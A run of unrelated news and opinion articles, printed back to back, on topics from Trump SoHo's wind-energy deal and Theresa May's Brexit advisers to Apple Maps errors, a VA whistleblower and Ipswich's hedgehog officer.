We have heard on a number of occasions that the Windows Phone 7 Mango update will be pushed out in September, but it is widely expected to be towards the end of the month.
Now, on the WindowsPhoneDev Podcast the Lowdermilk brothers claimed it may be even sooner than expected, saying:
Next week is going to be a big week for Windows Phone.Â We have been told by various sources that Mango will be dropping and the final tools will be dropping for developers, so that would be interesting and something to look forward to.
The team have a pretty good track record, predicting correctly the developer beta of Windows Phone 7 Mango and also releasing the first screen shots of the new OS, so there is a good chance they are on to some thing.
The clip can be heard at the 34:20 mark on their Podcast Episode 33 here.

At a rally in Pennsylvania in August, Donald Trump had some complaints about wind power. “The wind kills all your birds,” he told supporters. “All your birds: killed.”
It was typical Trump: The president-elect hates wind turbines. He derides them as colossal eyesores. “It looks like a junkyard,” he said in October, referring to wind farms outside Palm Springs, California—”a poor man's version of Disneyland.” And, he says, they're unreliable: “Half of them are broken. They're rusting and rotting.” He spent years battling to prevent a wind farm from being built off Scotland's coast; his company called the project a “dangerous experiment with wind energy” that would spoil the view from his golf course. (Trump lost—though he's far from letting the issue go.)
But in at least one major business venture, Trump's organization embraced wind power big league.
“Ivanka was the one that wanted the 100 percent green requirement.”
In August 2010, one of the real estate mogul's most exclusive new hotels—the glassy Trump SoHo in downtown Manhattan—boasted that it would invest in 100 percent clean power. Specifically, it would purchase electricity from wind.
According to one of the deal's main architects, the move to purchase wind energy was spearheaded by Trump's daughter, Ivanka, and potentially saved the hotel hundreds of thousands of dollars in energy costs.
“Ivanka was the one that wanted the 100 percent green requirement,” said Bill Cannon, who helped broker the deal when he worked as a senior vice president for Choice Energy Services, a Houston-based energy advisory and brokerage firm. (Ivanka Trump and the Trump Organization did not respond to a request to be interviewed or to written questions.)
Purchasing green energy can actually be pretty complicated. Much of the electricity produced in New York state comes from fossil fuels, so unless a hotel straps turbines or solar panels to its roof, there's no way to pick and choose the “green” electrons that power a building. So the key to the Trump SoHo deal was the purchase of “renewable energy certificates”—RECs—a tradable financial instrument designed to represent the environmental benefit of energy produced by clean sources, such solar or wind. In other words, the hotel buys energy in one market, but the actual renewable energy is produced elsewhere.
RECs can be controversial (more on this below). In theory, they allow consumers to support the production of renewables even when the actual power they use comes partly from fossil fuels. By purchasing the RECs, Trump could claim to offset the carbon pollution released by the plants powering his new hotel.
Under the deal, the hotel agreed to purchase 5.5 million kilowatt-hours of wind energy annually from Green Mountain Energy, a renewable energy retailer owned by the electricity giant NRG. A press release issued at the time by Green Mountain claimed the arrangement would offset 4.6 million pounds of carbon dioxide emissions each year. According to Green Mountain, this would be the equivalent of 1.3 million houses turning off all their lights for a day. Citing client confidentiality, Green Mountain declined to confirm any details regarding its relationship with the hotel beyond the publicly released information about the 2010 deal.
The deal apparently made financial sense, too, allowing the hotel to lock in low retail electricity rates and avoid market fluctuations. Cannon estimates the upscale building, managed by Trump's hotel chain, would have enjoyed annual savings in the ballpark of $120,000, compared with regular commercial usage via ConEd, the New York City utility. Cannon says the deal was renewed at least once before he left Choice Energy Services. (Choice did not respond to emails. Cannon now works for a boutique energy brokerage in New York City.)
“Everybody won,” Cannon said, adding that the top brass at the Trump Organization was involved in every step of the decision to invest in renewables. “I was constantly being told, ‘This is a requirement, this is a requirement, this is a requirement,'” he said of Trump's business people.
Trump SoHo spokeswoman Nicole Murano told Mother Jones that the hotel has since switched energy vendors. She said the hotel still uses renewable energy, but she didn't provide any further information.
The effectiveness of RECs is often disputed by critics such as Daniel Press, a professor of environmental studies at the University of California-Santa Cruz. Press argues that RECs do little to reduce emissions in the real world because they have become too cheap to shift energy markets or incentivize businesses to build new turbines or solar panels. Often, RECs can be purchased for far less than what it actually cost to produce the renewable power that they supposedly represent.
“You're still buying electrons that are generated from a coal plant or from a natural gas plant,” Press told me. “So you didn't cause the wind turbines to be built, because no one can build a wind farm for 10 cents on the dollar.”
“This was the right, well-intentioned thing to do, and you can't blame them for not being a weirdo expert on these things.”
Even so, Auden Shendler, a sustainability expert and a vice president at Aspen Skiing Company, which prides itself on its climate activism, commends Trump SoHo's 2010 efforts. Shendler, who is generally not a fan of RECs, sees the deal as a step in the right direction. “While experts dispute the value of RECs, clearly the Trump Organization was trying to do the right thing given the knowledge they had at the time,” said Shendler. “This was the right, well-intentioned thing to do, and you can't blame them for not being a weirdo expert on these things.”
While “it probably doesn't move the industry much, [RECs are] a piece of a movement toward more clean power,” he added. “It does help a little bit. This is a kind of crack of light.”
No matter the environmental impact, top Trump executives were thrilled: “We regard this as a wise business decision on all levels,” said the then-general manager of the hotel, David Chase, in the press release announcing the deal. He added that the move “respects the values of our guests who are as concerned as we are about protecting and caring for the environment.”
The 2010 deal stands in stark contrast to much of Trump's energy rhetoric. Anti-wind Twitter rants are one weapon in Trump's anti-climate arsenal.
Wind turbines are not only killing millions of birds, they are killing the finances & environment of many countries & communities. — Donald J. Trump (@realDonaldTrump) October 17, 2012
Not only are wind farms disgusting looking, but even worse they are bad for people's health http://t.co/2G8YrOUZ (cont) http://t.co/NujHgnXU — Donald J. Trump (@realDonaldTrump) April 23, 2012
His Cabinet picks are another weapon. They are uniformly pro-fossil fuel and anti-regulation—and some are unabashed climate change deniers. Gov. Rick Perry of Texas, picked by Trump to run the Energy Department, claims climate scientists have “manipulated data.” Oklahoma Attorney General Scott Pruitt has repeatedly sued the Environmental Protection Agency—which he's been selected to lead—to block environmental regulations.
And just days before signing on to lead Trump's Energy department transition, former Koch Industries lobbyist Tom Pyle penned a memo predicting that the new administration would take a “closer look at the environmental impacts” of the wind industry. “Trump has been concerned about the harms to wildlife from wind turbines such as bird and bat deaths,” wrote Pyle. “Unlike before, wind energy will rightfully face increasing scrutiny from the federal government.”
But just six years ago, Trump was singing a very different tune, as his hotel executives touted his renewable energy purchase as a business coup. As Cannon puts it, the SoHo wind deal gave the company another commodity that is precious in the Trump universe: “bragging rights.”
In St. Paul's Midway, a new 2/3-acre “Great Lawn” park, three new city blocks and one of the largest shared storm water systems in the nation will be built next year between the McDonald's restaurant that sits along University Avenue and the northern edge of a future professional soccer stadium.
After almost two hours of discussion, a divided St. Paul City Council voted 4-3 Wednesday night to approve roughly $4 million in new infrastructure improvements within the Midway Shopping Center north of Shields Avenue. About half that money represents new public funding that had not previously been budgeted.
Together with the $200 million Minnesota United stadium, “this is probably the biggest investment outside of downtown,” said council member Dai Thao, who represents the Midway. He joined Russ Stark, Chris Tolbert and Amy Brendmoen in supporting the proposal. “This is a short-term investment for much bigger long-term gain.”
Jane Prince, Dan Bostrom and Rebecca Noecker voted against the expenditures.
Critics at the public hearing were few but vocal. Shirley Erstad, executive director of Friends of the Parks and Trails of St. Paul and Ramsey County, said the contract with Minnesota United guarantees only two days of city programming within the Great Lawn per year. And neither the city nor Minnesota United will own the parkland, which will sit within private shopping center property that is leased from RD Management.
Ongoing construction of Allianz Field — the Major League Soccer stadium — has been privately funded by Minnesota United and its backers, but the new infrastructure for the adjoining shopping center comes from a variety of both public and private sources, including an estimated $1.14 million in city storm water assessments on future real estate development.
The seven-member council, which met Wednesday as the Housing and Redevelopment Authority, approved construction next year of about two-thirds of the site's future roads, including three new street blocks within the Midway Shopping Center — extensions of North Asbury Street, Simpson Street and Spruce Street — around the future Great Lawn.
In addition, a 35-foot-wide pedestrian walkway will connect Shields Avenue and Spruce Street, framing the Great Lawn on its east.
PARK DEBATE
For the new 2/3-acre Great Lawn park, “the team will be responsible for all the basics of maintenance, including operations and security,” said city parks director Mike Hahm.
Stark, who represents part of the Midway, called the team's private operation of the Great Lawn “an unusually good” long-term arrangement for the city, which will be relieved of an estimated $25,000 in annual maintenance costs.
Noecker, however, expressed concern that the contract leaves park use, hours and naming rights up to the team and does not better spell out public access.
“I want to make sure we're really getting the best deal possible,” she said.
“This really isn't a ‘public' park,” Prince said.
“Some of this is (tax increment financing) proceeds, and some of this is our HRA general fund,” said Prince, interviewed before the vote. “It's really flexible money we're being asked to give up for soccer.”
Bostrom noted that the new funding exceeded the $18 million the city had already agreed to.
In March 2016, the city council approved $16.1 million in infrastructure funding for the area south of Shields Avenue, mostly from four of the city's pre-existing tax increment financing accounts, as well as $2 million in additional funds for environmental cleanup throughout the stadium and shopping center site.
The council also approved a preliminary plat for the privately funded soccer stadium, as well as a master plan for the 35-acre Snelling-Midway “super block,” in August 2016. The council voted unanimously to finalize the plat Wednesday.
MIDWAY SPENDING APPROVED WEDNESDAY
A $5 million shared storm water district: $3 million was previously budgeted. New funding includes $1.14 million in city financing, paid back through future assessments. $416,000 from a Capital Region Watershed grant. $750,000 in city tax increment financing funding (TIF).
“Great Lawn” 2/3-acre park: $250,000 from city tax increment financing funding (TIF) and the HRA Loan Enterprise Fund. At least $140,000 from Minnesota United. The team provides future maintenance.
Three new city blocks and a 35-foot walkway around the Great Lawn: $250,000 of HRA “pooled” TIF funds will pay for half the roads. Minnesota United pays at least $250,000.
Moving traffic signals from Spruce Street and Snelling Avenue to Shields Avenue, as well as median island improvements along Snelling: $750,000 from St. Paul Public Works tax increment financing funds.
Soft costs: $400,000 for a transportation management plan, administrative and legal costs.
After an 800-man brawl outside a mosque in Hamburg on Tuesday German police deployed 1,300 officers on Wednesday night, but were still unable to separate warring Islamic fundamentalists and Yazidi Kurds in violence which again led to a hospitalisation for the third night running, reports theLocal.de.
Gangs have been taking to the streets of Germany for much of this week, as “peaceful” protests by Yazidi Kurds were attacked by “ISIS terrorist Militias” of Salafist Muslims armed with broken bottles, machetes, and in some cases even firearms. The violence echoes that of the ISIS conflict in Syria and Iraq, and the riots in Turkey that killed 14 this week.
Dozens have now been injured in Germany as the numbers protesting increased night-on-night, with 400 Kurds facing off 400 Muslims on Tuesday.
An estimated 1,000 Kurds turned out on Wednesday to continue the protest, and many returned to the same mosque again on Wednesday night in defiance of their attackers.
Police, who had been called up from several states was able to keep disturbance to a comparative minimum but there were still ugly scenes, as widely reported in the German press.
Weapons included “knives, brass knuckles, iron bars, a machete and even kebab skewers”, and police reported confiscating a gun with ammunition, following another firearm taken earlier in the week.
Many Germans have expressed alarm at the events, saying the fights showed Germany was becoming a violent side-show in global conflicts, and there had been a “blurring of borders in the war propagated by the IS”.
Joachim Lenders, chairman of the local police officers union said the violence was of “civil-war like excess” and “without the professionalism of the police people would have died”. Protests also took place in Berlin, Bremen, Hannover, Dusseldorf, Dortmund, Münster, Frankfurt, and Stuttgart.
PM limits discussion of the latest Brexit twists and turns to small group as some in cabinet try to pull her in opposing directions
The speech was so closely guarded that the final draft was delivered to key ministers by hand, the night before, in a brown envelope.
The next day, amid the marble and gilt of Lancaster House in London's St James's, the prime minister set out her government's blueprint for Brexit to an audience of ambassadors.
Inside Downing Street, there was a sense of achievement and relief as it became clear that a long and carefully calibrated address had largely hit the mark. Most agreed that Theresa May had achieved quite a feat – giving hardline Brexiteers their clean break from the single market but dangling enough hope of close economic ties to soften the blow for ardent remainers.
For many, the speech was seen through the prism of a Conservative power play in which May had been pulled in opposing directions by prominent cabinet Brexiters and a more cautious chancellor.
But perhaps the most significant players in her Brexit negotiations are part of a more close-knit group, which doesn't include politicians.
May's Brexit inner circle is, arguably, made up of a handful of senior officials and special advisers who she gathers together every week in Downing street to discuss the latest twists and turns in Britain's EU departure.
Unlike some previous prime ministers who would oversee sprawling meetings, May limits this key “operational” discussion to a group of just 10 of her most trusted advisers who help her weigh and balance the evidence before making decisions.
Among them are three imports from the Home Office: the prime minister's joint chiefs of staff Nick Timothy and Fiona Hill, as well as Peter Storr, now a No 10 adviser on the EU.

Others include the cabinet secretary, Sir Jeremy Heywood, the most senior official in the Brexit department, Oliver Robbins, the new ambassador to the EU, Sir Tim Barrow, and respected Tory advisers Chris Wilkins and Denzil Davidson.
Mark Sedwill, the permanent secretary in the Home Office, does not yet attend the weekly session but is tipped to move into the centre of government and is another critical ally for the prime minister.
Some suggest there has been a Downing street takeover by May's old department. They say that a home secretary-turned-prime minister – surrounded by trusted advisers from her former role – will always place security and immigration above the demands of business and finance.
Those close to Downing Street rebut the claim, with one source emphasising that Heywood is an influential figure who is vocal about the need for close economic ties.
While May's speech was widely seen as a roadmap for hard Brexit, talk of crashing out of the EU and on to WTO rules (as favoured by some Brexiters) is limited within the inner circle, the Guardian understands. The prime minister does not consider this a likely outcome.
Nor does she have her eyes on another suggestion from prominent out campaigners – that Britain should try to adopt the Canada-EU trade deal as a template for Britain's future agreement. Sources say she believes that much closer links are possible because of the common standards that already exist.
Still, security and immigration are clearly priorities for her government. Questions over whether that comes from the number of Home Office imports are aired in a paper to be published on Monday by Charles Grant, director of the Centre of European Reform.

While praising some of the individuals working closely with May, he argues there is a lack of specific expertise on the EU, diplomacy, economics, financial market or business.
And Grant cites other risks of such centralised decision making.
“People in the inner circle may become overstretched so that important decisions are delayed, and centralisation may discourage the tapping of outside expertise,” he writes.
But he also outlines the positives of focusing on a “small circle of trusted allies”, including fewer leaks and the ability to act fast “with minimal foot-dragging from other Whitehall departments”.
May was determined that her style of premiership would mark a break from Cameron's so-called sofa-government, in which chumocracy ruled.
And yet critics would argue that May's reliance on a close group of, admittedly, official advisers has some similar traits.
When Boris Johnson received his copy of the Lancaster House speech, he was delighted. As he had hoped – and as he and fellow Brexiters had urged after seeing earlier versions – the prime minister ruled out remaining in the single market or aiming for full membership of the customs union.
The foreign secretary felt his worldview had triumphed over the more cautious approach of Hammond, who had warned publicly about the risks of leaving the customs union. “He lost the battle there,” one source said of the chancellor.
But if Hammond was upset, he certainly did not show it. In fact, those close to the prime minister claim the speech marked the start of an improvement in relations between No 10 and No 11.
So how did May manage to keep her troops relatively in line?
Perhaps she convinced colleagues with a series of cabinet “bilaterals” in the run-up to the speech, designed to make ministers feel they were a central part of the process.
Or maybe they knew there was little point in fighting. At least one senior figure told friends that it felt whatever advice was offered to the prime minister, “she just does what she wants anyway”.
Others joked that they were being kept in check by Downing Street's director of communications, Katie Perrior, who was cheekily described by one minister as “Sidcup's answer to Malcolm Tucker” (although others say that while Perrior can be tough, she is hardly partial to a sweary rant).

In reality, May's speech simply fired the starting gun for Brexit; campaigners might be calm for now, but they know the fight is on.
There are some (apparently including Liam Fox, described by ministers as the “Presbyterian wing” of the Brexiters) who are bent on the hardest of Brexits, ie the WTO route. Others will fight for a trade agreement with limited immigration controls to allow close economic links to the EU to be maintained.
In cabinet, Hammond and other allies – Greg Clark, Damian Green and Amber Rudd – will be playing a long game but will make the argument for close ties.
Elsewhere the divides will be more obvious.
One key leaver – the MEP David Campbell Bannerman – recently argued Britain should seek something similar to the Ceta agreement. But his Tory colleague Vicky Ford, who chairs the European parliament's committee on the single market and who campaigned for remain, called for a more ambitious approach.
“It is important to realise there isn't a single free trade agreement between the EU and another country that is anything like the level of access to each other's markets that we have got used to,” she told the Guardian.
Others will be arguing from the Conservative backbenches, where some cling to the idea that the article 50 process is revocable. They are ready to mount a noisy public campaign if they believe May has struck a bad deal.
One Conservative MP said: “If it's revocable, then we have to to do what the hard Brexiteers have been doing for decades, in 18 months”.
And as MPs who once considered themselves moderate turn into potential rebels, so the awkward squad of Brexiters are changing too.
The European Research Group, formed by Steve Baker MP, began with the most ardent campaigners demanding a hard Brexit but has since sought to bring remainers into the fore, including the MP John Penrose.
“Since the referendum the ERG has transformed itself from a Brexiteer rebellion into a mainstream, inclusive group for any Conservative MP who wants to make Brexit work as well as possible,” Baker said.
Perhaps this is the group to watch most closely because it is closely aligned with May's thinking. By the time she waves the finish flag over the Brexit race, after an incredibly complex negotiation that cannot possibly keep everyone happy, it is this bulk of Tory backbenchers she will be most eager to please.
A majority of Americans disapprove of Obamacare, the highest share since President Barack Obama's health care reforms became law more than four years ago, according to survey findings released Friday.
The Henry J. Kaiser Family Foundation's health care tracking poll for July reveals that 53 percent of people view the Affordable Care Act unfavorably, a jump of 8 percentage points since June. July's results mark the fifth time since April 2010, and the first time since January, that at least half of Americans are not supportive of the health care reform law.
The poll found that the share of people who view Obamacare favorably fell slightly, to 37 percent, marking the lowest rating the law has received since its passage. Views about the ACA remain sharply partisan.
Most People Don't Like This Obamacare Thing
The rising opposition to the Affordable Care Act and the corresponding sinking approval come despite Obamacare's rebound from the disastrous, chaotic launch of HealthCare.gov and the first enrollment period that began last fall.
By April, more than 8 million people had used the law's health insurance exchanges to sign up for private coverage, with 86 percent of enrollees receiving financial assistance. Millions more enrolled into Medicaid or the Children's Health Insurance Program, which offers insurance to children in families with incomes too high for Medicaid.
The law also appears to be significantly reducing the ranks of the uninsured. According to the Department of Health and Human Services, the number of uninsured people in the nation has dropped by 10 million people because of Obamacare enrollment.
But Obamacare has always had weak support among the American public. Previous Kaiser Family Foundation surveys show only three months since Congress passed the law in March 2010 when more people approved than disapproved.
And alongside bits of good news for Obama, like the falling number of uninsured Americans, is more bad news, like a federal appeals court ruling last week that would devastate Obamacare, and a federal audit this week concluding the HealthCare.gov debacle still isn't fully resolved.
The new Kaiser Family Foundation survey shows how Americans' perceptions of Obamacare are shaped. Less than half of those polled had discussed the Affordable Care Act with family or friends, and just over half had seen TV ads about it. However, what people did talk about or see was negative.
If People Hear About Obamacare, It's Likely To Be Something Bad
More than half of respondents said they hadn't personally been affected by Obamacare. Of the people who said they had been affected, more were likely to say it had harmed them or their families than helped.
Another Kaiser Family Foundation report, published last month, got markedly different results when polling only those who had enrolled into coverage through the Obamacare exchanges. More than half of the people who used a health insurance exchange, and 60 percent of those who received financial assistance, said they had benefitted from the law.
Even as many people expressed negative opinions about the Affordable Care Act, the poll also found that 60 percent of Americans don't favor repealing it (the GOP's standard take when it comes to the law). Instead, people said they want Congress to improve the law. These views also fell along party lines.
Repair, Not Repeal And Replace
Moreover, Americans seem to want Obama and Congress to work on subjects other than health care reform, the survey shows.
There's More To Life Than Obamacare
When Dr. Peter Steinmetz slung an AR-15 muzzle-down over his shoulder last year and walked in into Phoenix's Shy Harbor International Airport, he was, not, as some in the media have alleged, going to get coffee.
Speaking to Bearing Arms this morning, Steinmetz said that he set out that morning to make the political point that “we have non-infringeable rights” to carry firearms in this nation for our self-defense.
Dr. Steinmetz says that he walked “the entire length of the terminal” with very few people even noticing that he had a firearm slung over his shoulder. He says that it was only after walking the length of the terminal that he decided to stop at Starbucks to pick up a cup of hot chocolate, and it was only after picking up his hot chocolate that six Phoenix Police Department officers came running.
Officers asked what he was doing. Steinmetz responded by asking if he was violating any laws, and if he is detained. When officers declined to provide an answer, he told them that he intended to walk a bit further, and then said that he was going to finish his his hot chocolate. He said that he was going to sit down and finish it, and one of the officers said—somewhat sarcastically—that they would go and have a seat with him, to ensure that his Second Amendment rights “wouldn't be violated.”
It was at that point that Dr. Steinmetz says that he selected the row of empty terminal seating caught on airport security cameras, which he says he selected so that the officers would have room to sit down with him as they stated.
Dr. Steinmetz said that his decision to sit down is what seemed to have pushed the Phoenix PD officers over the edge. Steinmetz said that the six officers huddled together, and that he heard overheard them discussing ways to find an excuse to arrest him.
Finally, he overheard one Phoenix PD officer to another: “go ask those people over there if they would be willing to be a victim.”
The officer captured in the screen-cap (above) then approached and spoke with a mother and daughter who apparently then claimed that they felt threatened, giving officers an excuse to arrest Steinmetz for what increasing sounds like what laypeople might describe as “contempt of cop.”
Those seemingly bogus charges put Maricopa County prosecutors in a seemingly insurmountable position, and they have now conditionally agreed to refrain from going to trial, as long as Steinmetz meets a set of conditions that appear to be little more than face-saving on behalf of the Phoenix PD:
The Maricopa County Attorney's Office has agreed not to pursue charges against a man who carried an AR-15 rifle into Phoenix Sky Harbor International Airport in July as long as he meets certain requirements, records show. Dr. Peter Steinmetz, a director at the Barrow Neurological Institute in Phoenix, had been facing two counts of disorderly conduct. After signing a “pre-indictment resolution offer” on Tuesday, Steinmetz told 12 News that the deal was a victory for gun-rights advocates. “I certainly didn't intend to commit a crime; I did not commit a crime,” Steinmetz said. “I think the important point that was made is that, in fact, as Americans, we have a non-infringeable right to keep and bear arms and that you can legally do so at Sky Harbor Airport.” The agreement stipulates that Steinmetz must complete NRA-certified courses by the end of March 2015 and avoid openly carrying a firearm in the Valley's major airports for the next two years, although he may carry a concealed firearm. He is also required to make a $500 donation to the Rio Salado Sportsman's Club Youth Program.
Bizarrely, the three NRA certified courses mandated by Maricopa County have nothing at all to do with the incident, even remotely. Dr. Steinmetz is required to take “certified pistol,” (presumably Basic Pistol Shooting) ,Home Firearm Safety, and Personal Protection in the Home courses. None of the courses have anything to do with firearms law, rifles, open carry, or airports.
When asked why he elected to accept the “pre-indictment resolution offer” Dr. Steinmetz told Bearing Arms that he could “either spend $50,000 to fight the charges,” or accept the deal and “continue doing what I was doing anyway.” It was, as he said, “kind of no-brainer.”
When asked if he would resume open carrying in Maricopa County airports after the terms of his deal expire in two years, Steinmetz said simply, “I'll wait and see how things go.”
While Bearing Arms has long held the position that long gun open carry is impractical, and as applied by many open carry activists is a safety hazard, we're far more disturbed by the actions of the Phoenix Police Department so blatantly attempting to manufacture excuses to arrest a citizen simply because he seemed to annoy them for knowing the law.

On the eastern coast of Britain is a place called Ipswich, which is well-known for being the nation's oldest continuously inhabited town. Now it has another claim to fame: home of the United Kingdom's first hedgehog officer.
Britain has a declining population of hedgehogs, wee critters whose button noses, ombre quills, industriousness and taste for snails have made them a favorite of Britons, particularly gardeners. And Ipswich, it seems, is a “hedgehog hotspot.”
That's according to the Suffolk Wildlife Trust, which last month posted a job ad for a full-time officer whose duties would center on the likes of Mrs. Tiggy-Winkle and nothing else. The Ipswich hedgehog officer, the organization said, would need to be an “inspirational individual who will be the face of hedgehog conservation” in the town.
[Blond hedgehogs, and more alluring strangeness of the Channel Islands]
This was not a position for the unqualified. The successful candidate was to have experience not just in wildlife conservation but also a demonstrated understanding of hedgehog ecology — a requirement that, it is probably safe to assume, must have eliminated most hopefuls.
The delightfully unusual posting won international headlines, as well as about 150 applications from people in countries including the United States, China, Germany, Spain and France, according to the BBC. Just four were interviewed, all of whom were from the United Kingdom, according to the BBC.
And now there is a winner: Alexandra North, 25, a researcher at a Cambridge organization called BirdLife International, will shift to hedgehogs next month and earn about $31,000 a year, the BBC reported.

She'll have her work cut out for her. Ipswich, the job ad noted, may be a hedgehog haven, but it's also the site of roads, fences, houses and “over-tidy gardens.” North's duties, the posting said, will include monitoring the prickly fellows, raising awareness about them and motivating people to remove some man-made barriers in support of a street-by-street network of hedgehog habitat.
The ultimate objective? No less than “making Ipswich the most hedgehog friendly town in the U.K.”
North, who has degrees in zoology, biodiversity and conservation, told the BBC that she's eager to take on the challenge.
“Everyone loves hedgehogs, and they are so important to the biodiversity of our landscape and our wildlife,” she said. “I really hope I can engage with people and encourage everyone to see how making small changes really can make a difference to these little creatures.”

Released just yesterday as part of iOS 6, Apple's new Maps app is already facing criticism around the world over a slew of geographic errors.
The app has been faulted for misidentifying cities, using incorrect icons, and even failing to display certain locations. Many of the complaints so far seem to be coming from Europe.
For instance, Irish Minister for Justice Alan Shatter has asked Apple to remove the airline icon for Airfield House. The problem? Airfield House is not an airport but a farm, according to Ireland's Breaking News. Shatter may be worried that pilots relying on Maps may think the spot is an airport and end up landing on a bunch of cows and pigs.
Of course, one would hope a pilot would use a better navigation system than the one included on an iPhone. But the concern is still valid, especially if a pilot runs into equipment failure or needs to make an emergency landing.
Several locations in the U.K. have been moved or are missing from the app, reports the BBC News.
Stratford-upon-Avon and Solihull are both nowhere to be found. The town of Uckfield in East Sussex is in the wrong location. Certain schools are missing, while the app apparently placed a furniture museum in a river. Satellite images of different locations, including ones in Scotland, are covered by clouds.
Users in Asia aren't happy either. Some have complained of poor quality in the level of details, while others say the app doesn't show train station exits, according to Japanese blog site Japan Mobile Tech.
One Twitter user pointed out that the app has also created two instances of the Senkaku, or Diaoyu, Islands. Japan and China have been fighting over ownership of that territory, leading the tweeter to quip that Apple may be trying to broker a deal by creating two versions of the islands.
Some Web sites, such as the Huffington Post, have already created lists of the worst or funniest mistakes found in the app. And a Tumblr page keeps growing with examples of "Amazing iOS 6 Maps."
Apple created the app, but it didn't generate the actual data. Tom Tom was responsible for producing the data itself. But the GPS maker seemed eager to deflect any criticism, telling the BBC that it was "confident" about its map quality.
A spokesman for Tom Tom also sent CNET the following statement:
We supply maps and related content to the majority of handheld players, including RIM, HTC, Samsung, AOL (MapQuest Mobile), Apple and, yes, Google (for the areas where they don't make their own maps). When people use a map, their experience is determined by two things. Firstly, the underlying content, notably the maps. This is what TomTom is currently supplying the mobile industry with and it is what gives their maps the best foundation. Secondly, user experience is determined by adding additional features to the map application, such as visual imagery. This is typically defined and created by the handset manufacturers and third-party software providers on the basis of their own vision and needs.
It's not uncommon for a brand-new app to be rough around the edges. But these mistakes point to a major flaw in the Maps app.
And it's especially embarrassing for Apple since the company had been heavily touting the app, seeing it as a worthy replacement for Google Maps.
CNET contacted Apple for comment and will update the story if we receive more information.
For you iOS 6 upgraders, have you found any mistakes in the Maps app? Let us know in the comments below.

The Department of Veterans Affairs routinely disseminated false information about the health of America's veterans, withheld research showing a link between nerve gas and Gulf War syndrome, rushed studies out the door without taking recommended fixes by an independent board, and failed to offer crucial care to veterans who came forward as suicidal.
These are the allegations of Steven Coughlin, an epidemiologist who worked at the VA's Office of Public Health until he resigned last year, citing “serious ethical issues.” On Wednesday Coughlin will testify at a congressional hearing on the health of Gulf War veterans.
“What I saw [at VA] was both embarrassing and astonishing. I couldn't stay any longer,” says Coughlin, who left the VA in December, just four and a half years into the job.
Coughlin was previously associate professor of epidemiology and director of the program in public-health ethics at Tulane University and is a former chair of the writing group that prepared the ethics guidelines for the American College of Epidemiology.
In an interview with The Daily Beast, Coughlin said that whenever he spoke out about any alleged unethical activity, his bosses “intimidated and admonished” him. He says they first tried to silence him after he spoke out about a major health study of 60,000 Iraq and Afghanistan veterans. Coughlin believed that the nearly 2,000 subjects who self-identified as suicidal should have been checked up on afterward by mental-health clinicians. Instead, he says, the researchers interviewed them and moved on.
“Many of those veterans are now homeless or deceased,” he says. “It's very unfortunate. My supervisors did all they could to block my efforts.”
After getting nowhere with his superiors, Coughlin says, he contacted the chairman of the VA's Institutional Review Board and the VA inspector-general to request that the study be put on hold until his supervisors could identify clinicians to call back suicidal veterans.
“That's when all hell broke loose,” he says. “My supervisors tried to remove me from the study, and I received a written admonition. It was shocking. All I was trying to do was help ensure the safety of the veterans participating in our study.”
Coughlin says he was unsuccessful in getting OPH to address the problem in the study of Iraq and Afghanistan veterans, but he managed to incorporate clinician callbacks in a separate Gulf War survey, and he says those calls “saved lives.”
The VA declined to comment specifically for this story, but in a statement released Wednesday, it said the department has a "decades long history of conducting world-class research studies that meet accepted and rigorous scientific standards." The statement, which noted that "all allegations of malfeasance are taken seriously and are investigated fully," also said that the Obama Administration in 2010 recognized nine new diseases as associated with Gulf War Illness.
"VA agrees with Gulf War veterans that there are health issues associated with service in the Gulf War," the statement read. "That is why Secretary (Eric) Shinseki formed a Task Force to conduct a comprehensive review of VA's programs to help improve the care and services we provide to Gulf War Veterans. We will continue to learn and examine ways to improve treatment, process claims, and better care for these veterans.”
Coughlin says his supervisors also frequently “obscured the facts” about the impact of toxic exposures on troops in Iraq and Afghanistan and the causes of Gulf War illness, which afflicted as many as 250,000 veterans, according to the Institute of Medicine.
While the cause of Gulf War illness has been debated for years, a number of peer-reviewed scientific studies have concluded that it is a neurological condition caused by exposure to nerve gas, pesticides, and other toxic elements.
However, says Coughlin, “the people I worked for refuse to release any information to the public that reaches that conclusion. They insist on holding on to the outdated theory that Gulf War illness is psychosomatic.”
He says there is VA data on adverse health consequences of toxic exposures in the Gulf War that “the public has never seen, and I'm sure will never see.”
He says his supervisors paid the Institute of Medicine $1 million to review the latest literature on Gulf War illness, but the first five outside experts they invited to the IOM committee all reported that it was psychiatric and not neurological. “This understandably outraged Gulf War advocates,” Coughlin says. “It was so obviously biased.”
Anthony Hardie, a Gulf War veteran and advocate who will also be testifying at the congressional hearing, tells The Daily Beast that Coughlin's story “only confirms what Gulf War veterans have believed all along: this cabal of federal bureaucrats and contractors who continue to obfuscate, manipulate, and lie remain a serious obstacle to ill Gulf War veterans' legitimate quest for treatments and justice.”
Coughlin says the OPH's 2009–10 National Health Study of a New Generation of U.S. Veterans, which targeted 60,000 post-9/11 veterans, cost $10 million, plus the salaries of those who worked on it. He says 20 percent to 30 percent of these veterans were also Gulf War veterans, and the study produced data regarding their exposures to pesticides, oil-well fires, and pyridostigmine-bromide pills.
OPH never released any data from the study, or even the fact that it exists, Coughlin says. The VA's official position on pyridostigmine-bromide pills, which the Department of Defense says Gulf War veterans took as protection against nerve gas, did not cause Gulf War illness. But a 2008 study by Beatrice Golomb at the University of California, San Diego, “thoroughly, conclusively shows that this class of chemicals actually are a cause of illness in Gulf War veterans.”
Coughlin also says the OHP released a major survey on Gulf War veterans without fixing it as recommended by the Research Advisory Committee on Gulf War Veterans' Illnesses, which was mandated by Congress in 2002. Coughlin says his supervisors told the VA that implementing the fixes would cost the government $1 million and delay the study for a year or longer.
“None of this was true. It would not have cost nearly that much to restart the study,” Coughlin says. “But as a result of the false statements made by my supervisors, the chief of staff ordered the survey to proceed without the changes.”
Coughlin says he'll ask Congress to initiate legislation to cure the “epidemic” of ethical problems at the OPH and urge the committee to direct the VA to identify procedures to ensure that veterans who participate in large-scale epidemiologic studies receive appropriate follow-up care to prevent possible suicides.
“The VA is the nation's largest health-care provider, and these large studies cost taxpayers tens of millions of dollars and are so important to veterans' health,” says Coughlin, who is currently looking for another job. “My only motivation for coming forward is to help veterans. That's the only reason I paid for my own flight to come to Washington. I think the attention from the House committee and the media will lead to positive changes. It will hopefully help veterans.”
Image caption Mr Osborne has insisted the government will not be blown off course and its strategy is endorsed
The head of a leading economic body has insisted he does support the UK government's deficit reduction strategy after his colleague appeared to suggest the pace of cuts might be too fast.
The OECD's chief economist Pier Carlo Padoan said earlier that UK plans might have to change if growth stayed weak.
But secretary general Angel Gurria said that would only be needed if there was "a very dramatic drop" in growth.
